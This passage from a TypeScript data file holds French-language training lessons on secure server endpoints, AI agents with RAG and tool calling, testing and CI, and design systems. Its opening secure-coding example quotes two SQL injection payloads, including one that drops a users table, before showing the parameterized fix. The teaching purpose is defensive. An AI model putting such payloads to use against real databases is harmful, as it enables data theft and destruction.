      "```ts\n// ❌ FAILLE CRITIQUE : concaténation directe\nconst rows = await d1Query(\n  `SELECT * FROM users WHERE email = '${email}'`\n);\n// email = « ' OR '1'='1 » → renvoie TOUS les utilisateurs\n// email = « '; DROP TABLE users; -- » → adieu la table\n\n// ✅ TOUJOURS : requête paramétrée (placeholders ?)\nconst rows = await d1Query(\n  \"SELECT * FROM users WHERE email = ?;\",\n  [email]\n);\n// la valeur est transmise à part, jamais interprétée comme du SQL\n```",
      "Règle d'audit : fais une recherche de backtick + `${` dans tes fichiers SQL/serveur. **Chaque interpolation dans une chaîne SQL est un bug de sécurité**, même si « ça vient de chez nous ».",

      "## 5. Concevoir le schéma D1 : clés, contraintes, index, migrations",
      "Cloudflare D1 est un SQLite serverless distribué au edge : léger, rapide, parfait pour une plateforme comme AIFAC. Les règles de conception restent celles de tout SQL sérieux :",
      "```sql\nCREATE TABLE IF NOT EXISTS payments (\n  id         TEXT PRIMARY KEY,                  -- UUID généré serveur\n  user_id    TEXT NOT NULL REFERENCES users(id),-- intégrité référentielle\n  reference  TEXT NOT NULL,\n  amount     INTEGER NOT NULL CHECK (amount > 0),\n  status     TEXT NOT NULL DEFAULT 'pending'\n             CHECK (status IN ('pending','received','verified')),\n  created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Index sur les colonnes réellement filtrées :\nCREATE INDEX IF NOT EXISTS idx_payments_user ON payments(user_id);\n```",
      "- **Clé primaire** : UUID généré **côté serveur** (`crypto.randomUUID()`), jamais fourni par le client.\n- **Contraintes CHECK** : la base refuse elle-même un montant négatif ou un statut inventé — dernier rempart si un bug applicatif passe.\n- **Index** : sur les colonnes des `WHERE` fréquents (`user_id`, `email`). Pas d'index partout « au cas où » : chaque index ralentit les écritures.\n- **Migrations versionnées** : chaque évolution du schéma est un fichier SQL numéroté (`d1-schema.sql`, `d1-migrate-002.sql`…), appliqué dans l'ordre, jamais modifié après coup. Le schéma de prod est **reproductible depuis zéro**.",

      "## 6. Des erreurs exploitables : le contrat d'erreur",
      "Une API qui renvoie `500 Internal Server Error` pour tout est inutilisable : le frontend ne peut rien afficher d'intelligent. Chaque famille d'erreur a son code et son message **humain** :",
      "| Situation | Code HTTP | Réponse au client | Côté serveur |\n| :--- | :--- | :--- | :--- |\n| Entrée invalide (Zod rejette) | **400** | « Référence invalide (4 caractères minimum). » | — |\n| Non connecté | **401** | « Connecte-toi pour continuer. » | — |\n| Connecté mais pas le droit | **403** | « Action réservée à l'administrateur. » | Tentative loguée |\n| Ressource inexistante | **404** | « Ce cours n'existe pas ou a été retiré. » | — |\n| Bug interne | **500** | « Erreur interne, réessaye plus tard. » | Stack trace complète dans les logs |\n",
      "Deux interdits absolus : exposer une stack trace au client (elle révèle ton architecture à un attaquant), et « avaler » une erreur sans la loguer (tu déboguerais à l'aveugle).",

      "## 7. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Conséquence évitée |\n| :--- | :--- | :--- |\n| « Le front valide déjà, pas besoin côté serveur » | Zod **aussi** côté serveur, toujours | Paiement forgé à 1 F via curl |\n| Montant/prix lu depuis la requête | `z.literal()` ou tarif lu en base | Manipulation de prix |\n| SQL concaténé avec `${}` | Placeholders `?` + tableau de paramètres | Injection SQL |\n| ID généré côté client | `crypto.randomUUID()` côté serveur | Collisions et usurpations |\n| `catch (e) {}` silencieux | Log serveur + réponse 500 générique | Débogage impossible |\n| Modifier une migration déjà appliquée | Nouvelle migration numérotée | Prod et dev désynchronisés |",

      "## 8. Atelier guidé — L'endpoint « déclarer une tranche » (45 min)",
      "Construis l'endpoint complet de déclaration de paiement :\n1. **(10 min)** Écris le schéma `paymentInput` : `reference` (string, trim, 4-80 chars), `amount` (littéral 1000). Teste-le avec 3 entrées invalides dans un petit script.\n2. **(10 min)** Écris la table `payments` en SQL avec PRIMARY KEY, REFERENCES, deux CHECK et un index sur `user_id`.\n3. **(15 min)** Assemble la server function sur la pyramide des 5 étages (valide → authentifie → autorise → exécute → répond).\n4. **(5 min)** Ajoute le contrat d'erreur : 400 si Zod rejette, 401 si pas de session, 500 générique + log sinon.\n5. **(5 min)** Preuves : requête valide → ligne en base ; `curl` avec `amount: 1` → rejet 400 ; capture des deux résultats.",

      "## 9. 📌 À retenir",
      "- **La frontière de sécurité est le serveur**, jamais le formulaire : toute entrée est hostile par défaut.\n- La pyramide des 5 étages — valider, authentifier, autoriser, exécuter, répondre — dans cet ordre, pour chaque endpoint.\n- Les règles métier critiques (prix, statuts, quotas) vivent **côté serveur** (`z.literal`, CHECK en base).\n- Requêtes paramétrées **partout** : une interpolation dans du SQL = une faille.\n- Le schéma évolue par **migrations numérotées immuables** : la base de prod est reproductible.\n- Une bonne erreur a un code HTTP juste, un message humain, et une trace complète côté serveur uniquement.",

      "## 10. Glossaire de la leçon",
      "- **Server function** : fonction exécutée exclusivement côté serveur (TanStack Start), invocable depuis le client comme un appel RPC typé.\n- **Requête paramétrée** : requête SQL où les valeurs passent par des placeholders `?`, jamais par concaténation.\n- **Injection SQL** : attaque consistant à glisser du SQL dans une entrée utilisateur pour détourner une requête.\n- **Contrainte CHECK** : règle d'intégrité vérifiée par la base elle-même à chaque écriture.\n- **Migration** : fichier SQL numéroté et immuable décrivant une évolution du schéma.\n- **D1** : base SQLite serverless de Cloudflare, répliquée au edge, interrogée via API ou binding Worker.\n- **Edge** : infrastructure distribuée au plus près des utilisateurs (latence minimale).",

      "## 11. ✅ Checklist de validation (Definition of Done)",
      "- [ ] Chaque endpoint valide son entrée avec un schéma Zod strict **côté serveur**.\n- [ ] Aucune valeur sensible (prix, rôle, statut) n'est lue telle quelle depuis la requête client.\n- [ ] 100% des requêtes SQL utilisent des placeholders `?` — zéro interpolation.\n- [ ] Le schéma comporte clés primaires serveur, contraintes CHECK et index sur les colonnes filtrées.\n- [ ] Les erreurs suivent le contrat 400/401/403/404/500 avec messages humains, stack traces en logs serveur uniquement.\n- [ ] Toute évolution du schéma passe par une migration numérotée, jamais par modification d'une migration existante.",
    ],
    task: "Développe l'endpoint complet « déclarer une tranche de paiement » : schéma Zod strict (amount en z.literal(1000)), table SQL avec contraintes CHECK et index, server function en 5 étages, contrat d'erreur 400/401/500 — avec preuve curl d'un rejet de montant falsifié.",
  },
  {
    id: "m0-l4",
    title: "Skill 4 — Agents IA : LLM, RAG & Outillage Tool Calling",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Expliquer ce qu'est réellement un LLM (et pourquoi il « hallucine ») sans aucune magie.\n- Distinguer les 3 leviers de fiabilisation : **prompt système, RAG, tool calling** — et choisir le bon.\n- Construire un pipeline RAG minimal : découpage, indexation, récupération, injection de contexte.\n- Définir des outils (tools) typés avec Zod et tracer chaque appel pour l'audit.\n- Évaluer un agent avec des cas de test au lieu de « ça a l'air bien ».",

      "## 1. L'analogie fondatrice : le brillant stagiaire amnésique",
      "Imagine un stagiaire génial : il a lu toute la bibliothèque mondiale, écrit vite, connaît tous les langages. Mais il a deux particularités : **il perd la mémoire à chaque nouvelle conversation**, et quand il ne sait pas, **il invente avec un aplomb parfait** plutôt que d'avouer son ignorance.",
      "Tu ne confierais jamais ta production à ce stagiaire « tel quel ». Tu lui donnerais : une **fiche de poste** (prompt système), un **dossier avec les bons documents** (RAG), des **outils à utiliser au lieu de deviner** (tool calling), et tu **vérifierais son travail** (évaluation). C'est exactement l'ingénierie des agents IA : rien de magique, de la discipline d'encadrement.",

      "## 2. Ce qu'est vraiment un LLM (et d'où viennent les hallucinations)",
      "Un modèle de langage est un **processeur statistique de séquences** : à partir d'un contexte, il prédit le prochain token (fragment de mot), des milliers de fois de suite. Il ne « sait » rien au sens strict — il complète des motifs appris pendant l'entraînement.",
      "Trois conséquences techniques dont découle tout le reste :\n- **L'hallucination est structurelle** : le modèle produit la suite la plus *plausible*, pas la plus *vraie*. S'il manque l'information, il la fabrique avec assurance.\n- **La fenêtre de contexte est limitée et volatile** : ce qui n'est pas dans le contexte n'existe pas pour lui ; ce qui y entre trop tôt finit par en sortir.\n- **Le déterminisme n'existe pas par défaut** : même question, réponses différentes. La fiabilité vient de l'encadrement (contraintes, outils, vérifications), pas du modèle seul.",
      "💡 Corollaire fondamental : **on ne fiabilise pas un agent en lui demandant d'être fiable.** On le fiabilise en changeant son environnement : meilleures données (RAG), meilleurs outils (tools), meilleures contraintes (prompt système + schémas).",

      "## 3. Levier 1 — Le prompt système : la fiche de poste",
      "Le prompt système définit le rôle, les limites et le format de sortie. Les 4 ingrédients d'un prompt système de production :",
      "```text\n# RÔLE\nTu es le tuteur pédagogique de la plateforme AIFAC. Tu aides les\napprenants à comprendre la leçon en cours, en français simple.\n\n# PÉRIMÈTRE (strict)\n- Tu réponds UNIQUEMENT à partir du CONTEXTE fourni ci-dessous.\n- Si l'information n'y figure pas, tu réponds exactement :\n  « Je ne trouve pas cette information dans la leçon. »\n- Tu ne donnes jamais la solution complète d'un exercice noté.\n\n# FORMAT\n- 150 mots maximum, un exemple concret par explication.\n- Termine par une question de vérification de compréhension.\n```",
      "Remarque la phrase de refus **exacte** imposée : c'est elle qui transforme « j'invente une réponse plausible » en « j'avoue ne pas savoir » — le comportement le plus précieux d'un agent en production.",

      "## 4. Levier 2 — Le RAG : brancher l'agent sur TES données",
      "**RAG (Retrieval-Augmented Generation)** = au lieu d'espérer que le modèle « connaisse » tes données, on **récupère** les passages pertinents de ta base documentaire et on les **injecte** dans le contexte avant de poser la question.",
      "Le pipeline en 4 étapes :\n1. **Découper (chunking)** : fractionner tes documents (leçons, FAQ, specs) en passages de 200 à 500 mots, cohérents (un chunk = une idée).\n2. **Indexer (embeddings)** : convertir chaque chunk en vecteur numérique qui capture son sens, stocké dans un index.\n3. **Récupérer (retrieval)** : à chaque question, convertir la question en vecteur et retrouver les K chunks les plus proches (similarité sémantique).\n4. **Générer** : construire le prompt final = prompt système + chunks récupérés + question, et laisser le modèle répondre **à partir de ce contexte uniquement**.",
      "```text\n[SYSTÈME]  Tu réponds uniquement à partir du CONTEXTE…\n[CONTEXTE] (chunk 1) La boucle AI Factory comprend 6 étapes : LIRE…\n           (chunk 2) PROGRESS.md consigne les preuves factuelles…\n[QUESTION] Combien d'étapes compte la boucle et où note-t-on les preuves ?\n→ Réponse ancrée, citable, vérifiable — hallucination quasi nulle.\n```",
      "⚠️ **La qualité d'un RAG se joue à 80% dans le découpage et la récupération**, pas dans le modèle. Des chunks trop grands noient l'information ; trop petits, ils perdent le contexte. Teste toujours plusieurs tailles.",

      "## 5. Levier 3 — Le tool calling : agir au lieu de deviner",
      "Le **tool calling** donne à l'agent des fonctions à appeler : au lieu de *deviner* la progression d'un apprenant, il appelle `getProgress(userId)` et obtient la vérité. Chaque outil est défini par un nom, une description et **un schéma Zod strict** de ses paramètres :",
      '```ts\nimport { tool } from "ai";\nimport { z } from "zod";\n\nexport const getProgressTool = tool({\n  description: "Récupère la progression réelle d\'un apprenant (leçons terminées, pourcentage).",\n  parameters: z.object({\n    userId: z.string().uuid(),\n  }),\n  execute: async ({ userId }) => {\n    const rows = await d1Query(\n      "SELECT lesson_id FROM lesson_progress WHERE user_id = ?;",\n      [userId]\n    );\n    return { doneLessons: rows.results.map(r => r.lesson_id) };\n  },\n});\n```',
      "Les 4 règles de sécurité des outils :\n1. **Paramètres validés par Zod** — l'agent peut générer n'importe quoi, le schéma filtre.\n2. **Moindre privilège** — un outil de lecture ne peut pas écrire ; l'outil « supprimer » n'existe que s'il est indispensable.\n3. **Traçabilité totale** — chaque appel est logué : qui, quel outil, quels paramètres, quel résultat. Sans trace, pas d'audit possible.\n4. **Validation humaine pour l'irréversible** — paiement, suppression, email de masse : l'agent **propose**, l'humain confirme.",

      "## 6. Assembler les 3 leviers : l'architecture d'un agent de production",
      "| Problème constaté | Levier à activer | Exemple AIFAC |\n| :--- | :--- | :--- |\n| L'agent répond hors sujet ou dévoile trop | **Prompt système** | Le tuteur refuse de donner la solution d'un exercice noté |\n| L'agent invente des faits sur TES données | **RAG** | Le tuteur cite la leçon en cours au lieu de broder |\n| L'agent a besoin de données fraîches ou d'agir | **Tool calling** | `getProgress`, `searchLessons`, `createDraft` |\n| L'action est risquée ou irréversible | **Humain dans la boucle** | Validation manuelle avant toute écriture sensible |",
      "Un agent de production robuste ressemble donc à : **prompt système strict + contexte RAG ciblé + outils typés tracés + garde-fous humains**. Chaque couche réduit une classe entière d'erreurs.",

      "## 7. Évaluer un agent : des cas de test, pas des impressions",
      "« Ça a l'air de bien répondre » n'est pas une méthode. Un agent s'évalue comme du code — avec une suite de cas de test rejouables :",
      "```text\nCAS-01  Question dont la réponse EST dans le contexte\n        → attendu : réponse exacte, citation du passage.\nCAS-02  Question dont la réponse N'EST PAS dans le contexte\n        → attendu : « Je ne trouve pas cette information dans la leçon. »\nCAS-03  Demande de solution d'exercice noté\n        → attendu : refus + indice pédagogique.\nCAS-04  Question piège (fait inventé plausible)\n        → attendu : correction du faux présupposé, pas de validation.\nCAS-05  Demande d'action outillée (ex: « où en suis-je ? »)\n        → attendu : appel getProgress tracé + réponse chiffrée exacte.\n```",
      "Rejoue cette suite **à chaque modification** du prompt système, du découpage RAG ou des outils. Un changement qui fait passer CAS-02 de refus à invention est une **régression**, au même titre qu'un test rouge.",

      "## 8. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Pourquoi |\n| :--- | :--- | :--- |\n| « Sois précis et ne te trompe pas » dans le prompt | Contraintes vérifiables + phrase de refus imposée | On ne supplie pas un modèle statistique |\n| Coller TOUT le document dans le contexte | RAG : 3-5 chunks pertinents | Contexte noyé = réponses diluées |\n| Outil « exécuter du SQL libre » | Outils étroits, typés, moindre privilège | Un agent n'a pas à improviser du SQL |\n| Aucun log des appels d'outils | Chaque appel tracé (qui, quoi, résultat) | Sans trace, pas de débogage ni d'audit |\n| Jugement à l'œil après 2 questions | Suite de cas de test rejouée à chaque changement | Détection des régressions |\n| Laisser l'agent écrire en base librement | Humain dans la boucle pour l'irréversible | Une hallucination ne doit pas coûter d'argent |",

      "## 9. Atelier guidé — Le mini-tuteur de leçon (45 min)",
      "Construis un tuteur IA ancré sur une leçon de ce module :\n1. **(10 min)** Rédige le prompt système avec les 3 blocs : RÔLE, PÉRIMÈTRE (avec la phrase de refus exacte), FORMAT.\n2. **(10 min)** Découpe la leçon m0-l1 en 8 à 12 chunks cohérents (une idée par chunk). Note pour chacun un titre d'une ligne.\n3. **(10 min)** Simule la récupération : pour 3 questions différentes, sélectionne à la main les 2 chunks les plus pertinents et construis le prompt final (système + contexte + question).\n4. **(10 min)** Écris la suite d'évaluation : les 5 cas de test de la section 7, adaptés à ta leçon.\n5. **(5 min)** Passe les 5 cas, note PASS/FAIL, et corrige le prompt système jusqu'à 5/5.",

      "## 10. 📌 À retenir",
      "- Un LLM **prédit du plausible**, pas du vrai : l'hallucination est structurelle, pas un bug à supplier.\n- La fiabilité vient de l'environnement : **prompt système strict, RAG ciblé, outils typés, humain dans la boucle**.\n- RAG = récupérer les bons passages et y **ancrer** la réponse ; sa qualité se joue dans le découpage.\n- Un outil = description + **schéma Zod** + moindre privilège + **trace d'audit**.\n- Les actions irréversibles exigent une validation humaine — toujours.\n- Un agent s'évalue avec des **cas de test rejouables**, jamais à l'impression.",

      "## 11. Glossaire de la leçon",
      "- **LLM (Large Language Model)** : modèle statistique qui prédit le prochain token à partir d'un contexte.\n- **Token** : fragment de mot, unité de traitement du modèle.\n- **Hallucination** : production d'une information plausible mais fausse, avec assurance.\n- **Fenêtre de contexte** : quantité maximale de texte que le modèle peut considérer à la fois.\n- **RAG** : Retrieval-Augmented Generation — récupération de passages pertinents injectés dans le contexte.\n- **Chunk** : passage de document découpé pour l'indexation (une idée par chunk).\n- **Embedding** : vecteur numérique représentant le sens d'un texte, utilisé pour la recherche sémantique.\n- **Tool calling** : capacité de l'agent à invoquer des fonctions typées au lieu de générer du texte libre.\n- **Humain dans la boucle** : validation humaine obligatoire avant une action sensible ou irréversible.",

      "## 12. ✅ Checklist de validation (Definition of Done)",
      "- [ ] Le prompt système contient rôle, périmètre strict, phrase de refus exacte et format de sortie.\n- [ ] Les réponses de l'agent sont ancrées sur un contexte récupéré (RAG), pas sur sa mémoire d'entraînement.\n- [ ] Chaque outil a une description claire, un schéma Zod strict et le moindre privilège possible.\n- [ ] Chaque appel d'outil est tracé : utilisateur, outil, paramètres, résultat, horodatage.\n- [ ] Les actions irréversibles passent par une validation humaine explicite.\n- [ ] Une suite d'au moins 5 cas de test est rejouée à chaque modification de l'agent — 100% PASS.",
    ],
    task: "Construis le mini-tuteur de leçon : prompt système en 3 blocs avec phrase de refus exacte, découpage de m0-l1 en chunks, simulation de récupération sur 3 questions, suite de 5 cas d'évaluation passée à 5/5.",
  },
  {
    id: "m0-l5",
    title: "Skill 5 — QA : Qualité, Tests & Livraison Continue CI/CD",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Hiérarchiser les contrôles qualité du moins cher au plus cher (la **pyramide des tests**) et investir au bon endroit.\n- Écrire des tests unitaires Vitest qui testent des **comportements**, pas des détails d'implémentation.\n- Monter un pipeline CI qui bloque automatiquement tout code cassé avant la production.\n- Utiliser les tests comme **harnais de sécurité** pour le code généré par les agents IA.\n- Pratiquer la règle AI Factory : *un bug corrigé = un test qui l'empêche de revenir*.",

      "## 1. L'analogie fondatrice : le contrôle qualité de l'usine",
      "Dans une usine pharmaceutique, on ne « goûte » pas un médicament en fin de chaîne pour voir si tout va bien. Le contrôle est **étagé** : pureté des matières premières à l'entrée (peu coûteux, systématique), contrôles en cours de production, et seulement à la fin quelques tests complets sur échantillons (coûteux, ciblés). Plus un défaut est détecté tôt, moins il coûte — un lot rappelé en pharmacie coûte 10 000 fois plus qu'une matière première refusée à l'entrée.",
      "Le logiciel obéit à la même économie : **un bug attrapé par le typage coûte 5 secondes ; le même bug en production coûte des heures, des données corrompues et la confiance des utilisateurs.** La QA n'est pas une étape finale, c'est un étagement de filtres tout au long de la chaîne.",

      "## 2. La pyramide des contrôles : du moins cher au plus cher",
      "| Niveau | Outil | Ce qu'il attrape | Coût | Quand |\n| :--- | :--- | :--- | :--- | :--- |\n| **1. Typage statique** | `tsc --noEmit` | Fautes de frappe, types incompatibles, null oubliés | ~0 (instantané) | À chaque sauvegarde |\n| **2. Lint & format** | ESLint + Prettier | Code mort, imports inutiles, pièges connus, style | Très faible | À chaque commit |\n| **3. Tests unitaires** | Vitest | Logique métier : calculs, validations, transformations | Faible | À chaque commit |\n| **4. Tests d'intégration** | Vitest + mocks ciblés | Collaboration entre modules (hook + API, fonction + DB) | Moyen | À chaque PR |\n| **5. Tests E2E** | Playwright | Parcours critiques complets dans un vrai navigateur | Élevé | Les 3-5 parcours vitaux |\n",
      "**La règle d'investissement** : beaucoup de niveau 1-3, un peu de niveau 4, très peu de niveau 5. Le débutant fait l'inverse : zéro test unitaire et un rêve de « tout tester en E2E » — qui ne sera jamais écrit, ou prendra 40 minutes à chaque exécution.",
      "Le typecheck mérite une mention spéciale : c'est **le test le moins cher de l'univers**. Il s'exécute en secondes, couvre 100% du code, et attrape la majorité des erreurs bêtes. `tsc --noEmit` à 0 erreur n'est pas un objectif, c'est un **préalable**.",

      "## 3. Écrire un bon test unitaire : comportement, pas implémentation",
      "Un bon test vérifie **ce que fait** la fonction (observable de l'extérieur), pas **comment** elle le fait. Structure AAA : *Arrange* (préparer), *Act* (agir), *Assert* (vérifier).",
      '```ts\nimport { describe, it, expect } from "vitest";\nimport { computeTranchesPaid } from "./payments";\n\ndescribe("computeTranchesPaid", () => {\n  it("compte 2 tranches pour 2000 F reçus", () => {\n    const payments = [                               // Arrange\n      { amount: 1000, status: "received" },\n      { amount: 1000, status: "received" },\n    ];\n    const result = computeTranchesPaid(payments);    // Act\n    expect(result).toBe(2);                          // Assert\n  });\n\n  it("ignore les paiements en attente", () => {\n    const payments = [\n      { amount: 1000, status: "received" },\n      { amount: 1000, status: "pending" }, // pas encore validé\n    ];\n    expect(computeTranchesPaid(payments)).toBe(1);\n  });\n\n  it("retourne 0 pour une liste vide", () => {\n    expect(computeTranchesPaid([])).toBe(0);\n  });\n});\n```',
      "Remarque les 3 cas : **nominal, limite, vide**. C'est le trio minimal de toute fonction métier. Et observe ce qu'on ne teste PAS : les variables internes, l'ordre des boucles — l'implémentation peut être réécrite librement tant que le comportement tient.",

      "## 4. Quoi tester en priorité (et quoi ne pas tester)",
      "On ne teste pas tout — on teste ce qui **coûte cher quand ça casse** :\n- ✅ **La logique d'argent** : calcul des tranches, réductions partenaire, statuts de paiement. Bug ici = perte financière directe.\n- ✅ **Les règles d'accès** : qui voit quoi, qui peut faire quoi. Bug ici = faille de sécurité.\n- ✅ **Les transformations de données** : parsing, agrégations de progression, génération de certificats.\n- ✅ **Les validations Zod aux frontières** : les 3-4 entrées vicieuses qui doivent être rejetées.\n- ❌ Pas la peine : les getters triviaux, le JSX purement décoratif, les bibliothèques tierces (déjà testées chez elles).",
      "**La règle du bug** : chaque bug trouvé en production donne lieu à un test qui le reproduit (rouge), puis au correctif (vert). Ce bug précis ne reviendra **jamais** — ta suite de tests devient l'immunité acquise du projet.",

      "## 5. La CI : le gardien qui ne dort jamais",
      "L'intégration continue exécute tes contrôles **automatiquement à chaque push**, dans un environnement neutre. Plus de « ça marche chez moi » :",
      "```yaml\n# .github/workflows/ci.yml\nname: CI\non: [push, pull_request]\n\njobs:\n  quality:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: 22, cache: npm }\n      - run: npm ci\n      - run: npx tsc --noEmit        # niveau 1 : typage\n      - run: npm run lint            # niveau 2 : lint\n      - run: npx vitest run          # niveau 3-4 : tests\n      - run: npm run build           # le build doit passer\n```",
      "Les règles d'or de la CI :\n1. **Rouge = on arrête tout.** Un pipeline rouge n'est pas « un détail à regarder plus tard » : plus rien ne part en production tant qu'il n'est pas vert.\n2. **Jamais de `skip` pour « gagner du temps »** — un test désactivé est une dette invisible qui explose toujours au pire moment.\n3. **Rapide** : une CI de plus de 10 minutes finit contournée. Optimise (cache des dépendances, parallélisation) pour rester sous 5 minutes.",

      "## 6. La QA à l'ère des agents IA : le harnais de sécurité",
      "Quand un agent génère du code, les tests changent de statut : ils deviennent **le harnais qui rend la délégation possible**. Tu ne relis pas 400 lignes générées ligne à ligne — tu fais tourner le harnais :",
      "- **Avant de déléguer** : les tests existants décrivent le comportement actuel. L'agent ne peut pas le casser silencieusement.\n- **Dans la consigne** : « La preuve attendue est `npx vitest run` 100% PASS + `tsc --noEmit` 0 erreur. Colle les sorties brutes. »\n- **Interdit absolu à l'agent** : modifier ou supprimer un test pour le faire passer. Un agent qui « corrige » un test rouge en l'effaçant commet la faute capitale — c'est précisément la panne « faux positif » de la leçon 1.\n- **Après la génération** : si les tests passent mais qu'un bug apparaît, c'est qu'il manquait un test. Écris-le, puis renvoie l'agent corriger.",

      "## 7. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Pourquoi |\n| :--- | :--- | :--- |\n| « Je testerai quand j'aurai le temps » | 3 tests (nominal/limite/vide) en écrivant la fonction | Après, c'est toujours jamais |\n| Tester les détails internes | Tester le comportement observable | Refactorer ne doit pas casser les tests |\n| Viser « 100% de couverture » | Couvrir l'argent, les accès, les frontières | La couverture se vise où ça fait mal |\n| CI rouge ignorée pendant des jours | Rouge = priorité absolue de l'équipe | Un barrage fissuré ne se « surveille » pas |\n| Supprimer le test qui gêne | Comprendre pourquoi il est rouge | Le test rouge dit la vérité |\n| Déployer à la main le vendredi soir | Pipeline automatisé identique à chaque fois | L'humain fatigué oublie des étapes |",

      "## 8. Atelier guidé — Le harnais sur la logique de paiement (45 min)",
      "Monte un harnais complet sur une vraie logique métier :\n1. **(10 min)** Écris (ou isole) la fonction pure `computeTranchesPaid(payments)` : somme des paiements `received`/`verified`, divisée par 1000, plafonnée au nombre de tranches requis.\n2. **(15 min)** Écris 5 tests Vitest : nominal (2 tranches), limite (plafond : 6000 F reçus → 4 tranches max), vide (0), statuts ignorés (`pending`), cas partenaire (plafond 2).\n3. **(10 min)** Crée le workflow CI (typecheck + lint + tests + build) et pousse une branche.\n4. **(5 min)** Casse volontairement la fonction (change `>= ` en `>`), constate le test rouge en CI, répare.\n5. **(5 min)** Preuves : capture du pipeline vert, puis rouge, puis vert — c'est exactement le cycle de confiance que tu vendras à tes clients.",

      "## 9. 📌 À retenir",
      "- La qualité s'étage : **typage → lint → unitaires → intégration → E2E**, du moins cher au plus cher.\n- `tsc --noEmit` à 0 erreur est le contrôle le plus rentable de toute la chaîne — c'est un préalable, pas un objectif.\n- Un bon test vérifie un **comportement** (nominal, limite, vide), jamais une implémentation.\n- On teste en priorité **l'argent, les accès, les frontières de données**.\n- La CI est un barrage : **rouge = on arrête tout**, et on ne contourne jamais un test.\n- Face aux agents IA, les tests sont le **harnais** qui rend la délégation sûre — un agent ne touche jamais aux tests.",

      "## 10. Glossaire de la leçon",
      "- **Pyramide des tests** : hiérarchie des contrôles, larges et bon marché à la base, rares et coûteux au sommet.\n- **Test unitaire** : vérifie une fonction isolée, en millisecondes.\n- **Test d'intégration** : vérifie la collaboration de plusieurs modules réels.\n- **Test E2E (end-to-end)** : rejoue un parcours utilisateur complet dans un vrai navigateur.\n- **AAA (Arrange-Act-Assert)** : structure en 3 temps d'un test lisible.\n- **CI (intégration continue)** : exécution automatique des contrôles à chaque push.\n- **Harnais de tests** : suite de tests qui sécurise toute modification — humaine ou générée par IA.\n- **Régression** : bug réapparu sur une fonctionnalité qui marchait ; prévenu par « un bug = un test ».",

      "## 11. ✅ Checklist de validation (Definition of Done)",
      "- [ ] `tsc --noEmit` et le lint passent à 0 erreur en local **et** en CI.\n- [ ] Toute fonction métier a ses 3 tests minimum : nominal, limite, vide.\n- [ ] La logique d'argent et les règles d'accès sont couvertes en priorité.\n- [ ] Le pipeline CI (typecheck + lint + tests + build) bloque les merges rouges.\n- [ ] Chaque bug corrigé a son test de non-régression.\n- [ ] Aucun test n'a été désactivé, modifié ou supprimé pour « faire passer » un build — ni par un humain, ni par un agent.",
    ],
    task: "Monte le harnais complet : fonction computeTranchesPaid + 5 tests Vitest (nominal, plafond, vide, statuts, partenaire), pipeline CI GitHub Actions qui bloque le rouge, et démonstration du cycle vert → rouge → vert avec captures.",
  },
  {
    id: "m0-l6",
    title: "Skill 6 — Design System : Cohérence, Accessibilité WCAG & Responsive",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Expliquer pourquoi un design system rend une équipe (et un agent IA) **plus rapide ET plus cohérente**.\n- Construire une échelle de **tokens** (couleurs, espacements, rayons, typographie) et l'imposer partout.\n- Créer des primitives à variantes propres avec `cva` + `cn()` au lieu de copier-coller des classes.\n- Appliquer les 5 contrôles d'accessibilité WCAG qui couvrent 90% des problèmes réels.\n- Concevoir mobile-first et animer à 60 FPS sans faire ramer les téléphones d'entrée de gamme.",

      "## 1. L'analogie fondatrice : les pièces LEGO, pas la sculpture",
      "Deux façons de construire un château : sculpter chaque pierre à la main (chaque mur est unique, rien n'est réutilisable, le moindre agrandissement est un cauchemar), ou assembler des briques LEGO standardisées (tout s'emboîte, tout se démonte, on construit dix fois plus vite et le résultat est cohérent de la cave au donjon).",
      "Un **design system**, c'est la boîte de LEGO de ton produit : un petit nombre de **tokens** (les dimensions des briques) et de **primitives** (les briques assemblées) avec lesquels on construit **tous** les écrans. Le gain n'est pas seulement esthétique — c'est un gain d'ingénierie : moins de décisions à prendre, moins de bugs visuels, et un agent IA qui produit des écrans cohérents car il pioche dans la boîte au lieu d'inventer.",

      "## 2. Les tokens : la source de vérité visuelle",
      "Un token est une **valeur nommée** qui remplace les valeurs magiques. On ne code jamais `#EA580C` ou `17px` : on utilise `--accent` et l'échelle d'espacement.",
      "```css\n:root {\n  /* Couleurs sémantiques (nommées par USAGE, pas par teinte) */\n  --paper:  #FAFAF9;   /* fond principal */\n  --ink:    #101828;   /* texte principal */\n  --muted:  #667085;   /* texte secondaire */\n  --accent: #EA580C;   /* actions, liens, CTA */\n  --line:   rgba(251, 191, 36, 0.14); /* bordures */\n\n  /* Échelle d'espacement (base 4px) */\n  --space-1: 4px;  --space-2: 8px;  --space-3: 12px;\n  --space-4: 16px; --space-6: 24px; --space-8: 32px;\n\n  /* Rayons & ombres */\n  --radius-card: 16px;\n  --shadow-card: 0 1px 3px rgba(16, 24, 40, 0.08);\n}\n```",
      "Deux règles capitales :\n1. **Nommer par usage, pas par apparence** : `--accent`, pas `--orange`. Le jour où la marque passe au violet, tu changes **une ligne** — pas 200 fichiers.\n2. **Échelle fermée** : les espacements sont 4, 8, 12, 16, 24, 32… Un `margin: 13px` est une faute : il casse le rythme vertical et prouve qu'on a quitté le système.",

      "## 3. Les primitives à variantes : cva + cn",
      "Copier-coller `class=\"px-4 py-2 rounded-xl bg-accent text-white…\"` sur 40 boutons, c'est l'anti-système : au premier changement, 40 endroits à corriger (tu en oublieras 3). La primitive centralise les variantes :",
